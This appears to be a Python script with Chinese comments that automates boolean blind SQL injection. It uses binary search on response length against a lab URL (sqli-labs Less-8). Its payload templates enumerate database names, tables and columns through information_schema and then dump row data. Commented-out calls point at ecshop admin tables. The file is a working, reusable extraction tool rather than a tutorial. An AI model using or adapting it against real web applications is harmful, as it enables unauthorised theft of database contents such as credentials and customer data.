#encoding=utf8
#二分法bool盲注,基于返回数据包长度判断，

from string import Template
import requests

#-----------------------------------配置参数区start-----------------------------------
flag_length=706                         #正常返回的数据包长度
url='http://192.168.43.139/sqli/Less-8/'    #存在漏洞的url
#爆数据库的payload
payload_db="1' and ascii(substr((select schema_name from information_schema.schemata limit ${limit},1),${position},1))>=${ord}#"
#爆表的payload
payload_t="1' and ascii(substr((select table_name from information_schema.tables where table_schema='${db}' limit ${limit},1),${position},1))>=${ord}#"
#爆字段的payload
payload_c="1'  and ascii(substr((select column_name from information_schema.columns where table_name='${table}' and table_schema='${db}' limit ${limit},1),${position},1))>=${ord}#"
#爆数据的payload
payload_data="1' and ascii(substr((select concat_ws(',',${columns}) from ${db}.${table} limit ${limit},1),${position},1))>=${ord}#"

method='get'                            #请求方法 get or post
key='id'
data={}                        #post参数
params={}                           #url参数
#-----------------------------------配置参数区end-----------------------------------

def httpsend(payload):
    if method=='get':
        params[key]=payload
        # print params
        request=requests.get(url,params=params)
    else:
        data[key]=payload
        request=requests.post(url,data=data,params=params)
    return request
#二分法
def bisection(payloadx,i,position):
    chars=range(31,128)
    index=len(chars)//2
    while index!=0:
        c=chars[index]
        payload=Template(payloadx).safe_substitute(limit=i,position=position,ord=c)
        # print(payload)
        request=httpsend(payload)
        # print request.url
        if len(request.text)==flag_length:
            chars=chars[index:]
        else:
            chars=chars[:index]
        index=len(chars)//2
        request.close()
    return chr(chars[0])

def getString(payload):
    names=[]
    i=25
    while True:
        j=1
        name=bisection(payload,i,j)
        # print name
        if name=='\x1f':
            return names
        while name[-1]!='\x1f':
            j+=1
            name+=bisection(payload,i,j)
            print(name[0:-1])
        names.append(name[0:-1])
        i+=1

def getDbs():
    return(getString(payload_db))

def getTables(db):
    payload=Template(payload_t).safe_substitute(db=db)
    return getString(payload)

def getColumns(db,table):
    payload=Template(payload_c).safe_substitute(table=table,db=db)
    return getString(payload)

def getData(db,table,columns):
    payload=Template(payload_data).safe_substitute(db=db,columns=columns,table=table)
    return getString(payload)

# print getDbs()
# print getTables('ecshop')
# print getColumns('ecshop','ecs_admin_action')
# print getData('ecshop','ecs_admin_action',"parent_id,action_code,relevance")
# print map(getTables,getDbs())
# print(getColumns('flag'))



